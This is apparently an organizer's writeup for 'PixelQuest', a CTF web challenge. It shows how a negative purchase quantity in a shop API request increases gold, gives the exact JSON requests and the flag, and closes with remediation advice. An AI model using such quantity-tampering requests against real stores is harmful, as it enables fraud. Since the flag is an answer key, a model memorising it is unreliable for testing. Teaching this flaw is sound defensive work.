# Challenge 4: PixelQuest — Official Organizer Writeup

* **Category**: Gamified Web / Business Logic Flaw
* **Difficulty**: Easy-Medium
* **Points**: 175
* **Flag**: `CTF{r3tr0_g4m3_l0g1c_pwn3d_2026}`

---

## 📖 Challenge Description for Players
> *PixelQuest is an 8-bit retro cyber dungeon RPG. The King has promised the mythical Root Flag to whoever brings the 'Ancient Crown of Root' to the Royal Enclave. However, the Goblin Merchant charges a whopping 1,000,000 Gold for it, and the Dungeon Dragon is practically invincible! Can you hack your way to the top of the leaderboards and claim the Crown?*
>
> **Target**: `http://<HOST_IP>:8004`

---

## 🎯 Intended Vulnerability & Exploit Paths

### Step 1: Analyzing the Shop API
When purchasing items in the game UI, the client sends a `POST /api/shop/buy`:
```json
{
  "item_id": "health_potion",
  "quantity": 1
}
```

### Step 2: Discovering Negative Quantity Underflow
In [`app/main.py`](file:///d:/CTF/challenges/04-game-pixelquest/app/main.py), the backend calculates the purchase cost as:
```python
total_cost = item["price"] * req.quantity
player["gold"] -= total_cost
```
Because `req.quantity` is not restricted to strictly positive integers (`quantity > 0`), passing a negative number:
```json
{
  "item_id": "iron_sword",
  "quantity": -15000
}
```
Calculates `total_cost = 100 * -15000 = -1,500,000`.
The subtraction `player["gold"] -= (-1500000)` increases the player's balance to over 1.5 million Gold!

### Step 3: Buying the Crown & Claiming the Flag
1. Purchase the Ancient Crown:
   ```json
   POST /api/shop/buy
   {"item_id": "mythic_root_flag", "quantity": 1}
   ```
2. Claim the flag from the Royal Enclave:
   ```json
   POST /api/shop/claim-flag
   ```
   **Output**: `CTF{r3tr0_g4m3_l0g1c_pwn3d_2026}`

---

## 🛡️ Remediation / Real-World Takeaways
1. Always validate numerical input ranges on server endpoints (`quantity >= 1` and `quantity <= MAX_LIMIT`).
2. Implement strict domain-level business constraints (e.g., Pydantic `Field(gt=0)`).
